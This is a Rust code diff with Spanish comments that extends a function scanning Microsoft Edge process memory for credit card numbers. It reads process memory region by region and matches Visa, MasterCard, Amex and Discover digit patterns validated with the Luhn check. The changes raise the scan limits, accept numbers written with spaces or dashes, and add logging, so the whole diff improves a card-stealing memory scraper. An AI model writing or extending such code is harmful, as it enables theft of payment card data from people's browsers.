@@ -151,7 +151,12 @@ pub fn scan_edge_memory_for_cards(edge: &EdgeProcess) -> Vec<CreditCardData> {
                 let region_end = (region_start + mbi.RegionSize as usize).min(0x7FFF_0000);
                 let mut region_addr = region_start;
                 
-                while region_addr < region_end && pages_scanned < 1000 {
+                if regions_checked < 10 {
+                    log(&format!("    ✅ Región válida: 0x{:08X}-0x{:08X} ({} KB)", 
+                        region_start, region_end, mbi.RegionSize / 1024));
+                }
+                
+                while region_addr < region_end && pages_scanned < 10000 {
                     let mut bytes_read: usize = 0;
                     
                     // ReadProcessMemory
@@ -190,12 +195,18 @@ pub fn scan_edge_memory_for_cards(edge: &EdgeProcess) -> Vec<CreditCardData> {
                 // Saltar al final de la región
                 address = region_end;
             } else {
-                // Región no válida, saltar su tamaño
-                address += mbi.RegionSize as usize;
+                // Región no válida, saltar pero limitado a 64KB máximo
+                let skip_size = (mbi.RegionSize as usize).min(0x10000); // Max 64KB
+                address += skip_size;
+                
+                if regions_checked < 10 {
+                    log(&format!("    ⏭️  Región inválida: 0x{:08X} (State={:X}, Protect={:X}, Size={} KB) - Skip {} KB", 
+                        address, mbi.State, mbi.Protect, mbi.RegionSize / 1024, skip_size / 1024));
+                }
             }
             
-            // Límite de regiones chequeadas
-            if regions_checked > 10000 || pages_scanned > 1000 || cards.len() > 100 {
+            // Límite de regiones chequeadas aumentado
+            if regions_checked > 100000 || pages_scanned > 10000 || cards.len() > 100 {
                 break;
             }
         }
@@ -227,22 +238,30 @@ fn search_credit_card_pattern(buffer: &[u8]) -> Option<CreditCardData> {
     // Convertir a string (ignorando bytes no-UTF8)
     let text = String::from_utf8_lossy(buffer);
     
-    // Buscar secuencias de 13-19 dígitos (números de tarjeta)
-    // Patrones comunes: 4xxx (Visa), 5xxx (MasterCard), 3xxx (Amex)
+    // Buscar secuencias de dígitos (números de tarjeta)
+    // Patrones: 4xxx (Visa), 5xxx (MasterCard), 3xxx (Amex), 6xxx (Discover)
+    // Pueden estar con espacios, guiones, o contiguos
+    
     let mut start = 0;
     while start < text.len() {
-        // Buscar inicio de número (4, 5, o 3)
-        if let Some(pos) = text[start..].find(|c: char| c == '4' || c == '5' || c == '3') {
+        // Buscar inicio de número potencial (4, 5, 3, 6)
+        if let Some(pos) = text[start..].find(|c: char| c == '4' || c == '5' || c == '3' || c == '6') {
             start += pos;
             
-            // Extraer siguiente secuencia de dígitos
-            let digits: String = text[start..]
+            // Extraer siguiente secuencia, permitiendo espacios y guiones
+            let raw_segment: String = text[start..]
                 .chars()
-                .take(19)
-                .filter(|c| c.is_ascii_digit())
+                .take(30) // Suficiente para "4111 1111 1111 1111"
                 .collect();
             
-            // Validar longitud y algoritmo de Luhn
+            // Extraer solo dígitos
+            let digits: String = raw_segment
+                .chars()
+                .filter(|c| c.is_ascii_digit())
+                .take(19)
+                .collect();
+            
+            // Validar longitud (13-19 dígitos) y algoritmo de Luhn
             if digits.len() >= 13 && digits.len() <= 19 {
                 if validate_luhn(&digits) {
                     return Some(CreditCardData {
